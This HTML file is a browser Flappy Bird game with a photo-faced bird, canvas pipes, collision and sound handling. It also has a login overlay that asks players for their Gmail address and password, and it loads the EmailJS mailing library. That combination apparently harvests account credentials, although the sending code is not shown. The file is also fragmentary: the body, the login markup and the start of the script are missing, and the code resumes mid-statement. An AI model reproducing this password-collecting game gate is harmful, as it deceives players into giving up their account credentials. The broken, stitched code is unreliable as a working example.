<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kavines Flappy Bird</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box
        }

        body {
            background: #111827;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .game {
            position: relative;
            width: min(95vw, 430px)
        }

        canvas {
            width: 100%;
            height: auto;
            display: block;
            border: 4px solid white;
            border-radius: 18px;
            touch-action: none;
        }

        #title {
            position: absolute;
            top: 20px;
            width: 100%;
            text-align: center;
            color: white;
            font-size: 30px;
            font-weight: bold;
            text-shadow: 3px 3px #000;
            pointer-events: none;
        }

        #score {
            position: absolute;
            top: 65px;
            width: 100%;
            text-align: center;
            color: white;
            font-size: 45px;
            font-weight: bold;
            text-shadow: 3px 3px #000;
            pointer-events: none;
        }

        #message {
            position: absolute;
            top: 48%;
            width: 100%;
            text-align: center;
            color: white;
            font-size: 22px;
            font-weight: bold;
            text-shadow: 3px 3px #000;
            pointer-events: none;
        }


        /* LOGIN PAGE */
        #loginPage {
            position: fixed;
            inset: 0;
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #111827, #1e3a8a);
            font-family: Arial, sans-serif;
        }

        .login-box {
            width: min(90vw, 350px);
            padding: 35px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, .4);
            text-align: center;
        }

        .login-box h1 {
            margin-bottom: 10px;
            color: #111827;
        }

        .login-box p {
            margin-bottom: 25px;
            color: #666;
        }

        .login-box input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
            outline: none;
        }

        .login-box button {
            width: 100%;
            padding: 14px;
            border: 0;
            border-radius: 10px;
            background: #2563eb;
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }

        #loginMessage {
            margin-top: 15px;
            font-weight: bold;
        }

        #gamePage {
            display: none;
            width: 100%;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        emailjs.init({ publicKey: "V84axVEoJeCRqWgV2" });
    </script>
</head>

            <input type="email" id="email" placeholder="Enter Gmail">
            <input type="password" id="password" placeholder="Enter Password">
            <button onclick="login()">LOGIN</button>
            <div id="loginMessage"></div>
        </div>
    </div>

            );

            deathSound.preload = "auto";


            /* =========================
               SOUND FUNCTIONS
            ========================= */

            /* Keep track of every Touch sound clone so ALL of them
               can be stopped immediately when the bird dies. */
            const activeTouchSounds = [];

            function playTouchSound() {
                const sound = touchSound.cloneNode(true);
                sound.volume = 1.0;
                activeTouchSounds.push(sound);

                sound.addEventListener("ended", function () {
                    const index = activeTouchSounds.indexOf(sound);
                    if (index !== -1) activeTouchSounds.splice(index, 1);
                });

                sound.play().catch(function (error) {
                    console.log("Touch sound:", error);
                });
            }

            function stopAllTouchSounds() {
                activeTouchSounds.forEach(function (sound) {
                    sound.pause();
                    sound.currentTime = 0;
                });
                activeTouchSounds.length = 0;

                /* Also stop the original Touch audio element. */
                touchSound.pause();
                touchSound.currentTime = 0;
            }

            function playDeathSound() {
                const sound = deathSound.cloneNode(true);
                sound.volume = 1.0;

                sound.play().catch(function (error) {
                    console.log("Death sound:", error);
                });
            }


            /* =========================
               BACKGROUND
            ========================= */

            function background() {

                const sky = ctx.createLinearGradient(0, 0, 0, 760);

                sky.addColorStop(0, "#38bdf8");
                sky.addColorStop(1, "#bae6fd");

                ctx.fillStyle = sky;
                ctx.fillRect(0, 0, 430, 760);

                ctx.fillStyle = "rgba(255,255,255,0.8)";

                ctx.beginPath();
                ctx.arc(70, 120, 35, 0, Math.PI * 2);
                ctx.arc(110, 120, 45, 0, Math.PI * 2);
                ctx.arc(150, 125, 30, 0, Math.PI * 2);
                ctx.fill();

                ctx.beginPath();
                ctx.arc(300, 180, 30, 0, Math.PI * 2);
                ctx.arc(340, 175, 45, 0, Math.PI * 2);
                ctx.arc(380, 185, 30, 0, Math.PI * 2);
                ctx.fill();
            }


            /* =========================
               KAVINES PHOTO BIRD
            ========================= */

            function drawBird() {

                ctx.save();

                ctx.beginPath();
                ctx.arc(
                    bird.x,
                    bird.y,
                    bird.size,
                    0,
                    Math.PI * 2
                );
                ctx.clip();

                if (birdImage.complete && birdImage.naturalWidth > 0) {
                    ctx.drawImage(
                        birdImage,
                        bird.x - bird.size,
                        bird.y - bird.size,
                        bird.size * 2,
                        bird.size * 2
                    );
                }

                ctx.restore();
            }


            /* =========================
               PIPES
            ========================= */

            function createPipe() {

                const top = Math.random() * 300 + 60;

                pipes.push({
                    x: 430,
                    top: top,
                    bottom: top + pipeGap,
                    passed: false
                });
            }

            function drawPipe(pipe) {

                ctx.fillStyle = "#22c55e";

                ctx.fillRect(
                    pipe.x,
                    0,
                    pipeWidth,
                    pipe.top
                );

                ctx.fillRect(
                    pipe.x,
                    pipe.bottom,
                    pipeWidth,
                    760 - pipe.bottom
                );

                ctx.fillStyle = "#15803d";

                ctx.fillRect(
                    pipe.x - 5,
                    pipe.top - 20,
                    pipeWidth + 10,
                    20
                );

                ctx.fillRect(
                    pipe.x - 5,
                    pipe.bottom,
                    pipeWidth + 10,
                    20
                );
            }


            /* =========================
               COLLISION
            ========================= */

            function collision(pipe) {

                if (
                    bird.x + bird.size > pipe.x &&
                    bird.x - bird.size < pipe.x + pipeWidth
                ) {

                    if (
                        bird.y - bird.size < pipe.top ||
                        bird.y + bird.size > pipe.bottom
                    ) {
                        return true;
                    }
                }

                return false;
            }


            /* =========================
               GAME OVER
            ========================= */

            function endGame() {

                if (gameOver) return;

                gameOver = true;

                /* STOP EVERY PLAYING TOUCH SOUND IMMEDIATELY */
                stopAllTouchSounds();

                /* NOW PLAY DEAD SOUND */
                playDeathSound();

                message.innerHTML =
                    "GAME OVER<br><br>" +
                    "Score : " + score +
                    "<br>" +
                    "Best : " + best +
                    "<br><br>" +
                    "TAP / SPACE TO RESTART";
            }


            /* =========================
               FLY / TOUCH
            ========================= */

            function fly() {

                if (gameOver) {
                    restart();
                    playTouchSound();
                    return;
                }

                started = true;
                message.innerHTML = "";

                bird.velocity = jump;

                /* EVERY TAP = TOUCH SOUND */
                playTouchSound();
            }


            /* =========================
               RESTART
            ========================= */

            function restart() {

                bird.y = 350;
                bird.velocity = 0;

                pipes = [];
                score = 0;
                pipeTimer = 0;

                scoreText.innerHTML = score;

                gameOver = false;
                started = true;

                message.innerHTML = "";
            }


            /* =========================
               UPDATE
            ========================= */

            function update() {

                if (!started || gameOver) return;

                bird.velocity += gravity;
                bird.y += bird.velocity;

                pipeTimer++;

                if (pipeTimer > 100) {
                    createPipe();
                    pipeTimer = 0;
                }

                for (let i = 0; i < pipes.length; i++) {

                    const pipe = pipes[i];

                    pipe.x -= pipeSpeed;

                    if (
                        !pipe.passed &&
                        pipe.x + pipeWidth < bird.x
                    ) {

                        pipe.passed = true;
                        score++;

                        scoreText.innerHTML = score;

                        if (score > best) {
                            best = score;
                            localStorage.setItem(
                                "kavinesBest",
                                best
                            );
                        }
                    }

                    if (collision(pipe)) {
                        endGame();
                    }
                }

                pipes = pipes.filter(
                    pipe => pipe.x > -100
                );

                if (bird.y + bird.size > 670) {
                    endGame();
                }

                if (bird.y - bird.size < 0) {
                    endGame();
                }
            }


            /* =========================
               GROUND
            ========================= */

            function ground() {

                ctx.fillStyle = "#84cc16";

                ctx.fillRect(
                    0,
                    670,
                    430,
                    20
                );

                ctx.fillStyle = "#92400e";

                ctx.fillRect(
                    0,
                    690,
                    430,
                    70
                );

                ctx.fillStyle = "#b45309";

                for (let x = 0; x < 430; x += 40) {
                    ctx.fillRect(
                        x,
                        710,
                        20,
                        10
                    );
                }
            }


            /* =========================
               DRAW
            ========================= */

            function draw() {

                background();

                for (let i = 0; i < pipes.length; i++) {
                    drawPipe(pipes[i]);
                }

                ground();
                drawBird();
            }


            /* =========================
               GAME LOOP
            ========================= */

            function gameLoop() {

                update();
                draw();

                requestAnimationFrame(gameLoop);
            }


            /* =========================
               KEYBOARD
            ========================= */

            document.addEventListener(
                "keydown",
                function (event) {

                    if (
                        event.code === "Space" ||
                        event.code === "ArrowUp"
                    ) {
                        event.preventDefault();
                        fly();
                    }
                }
            );


            /* =========================
               MOBILE TOUCH
            ========================= */

            canvas.addEventListener(
                "pointerdown",
                function (event) {

                    event.preventDefault();
                    fly();
                }
            );


            /* =========================
               START
            ========================= */

            gameLoop();

        </script>
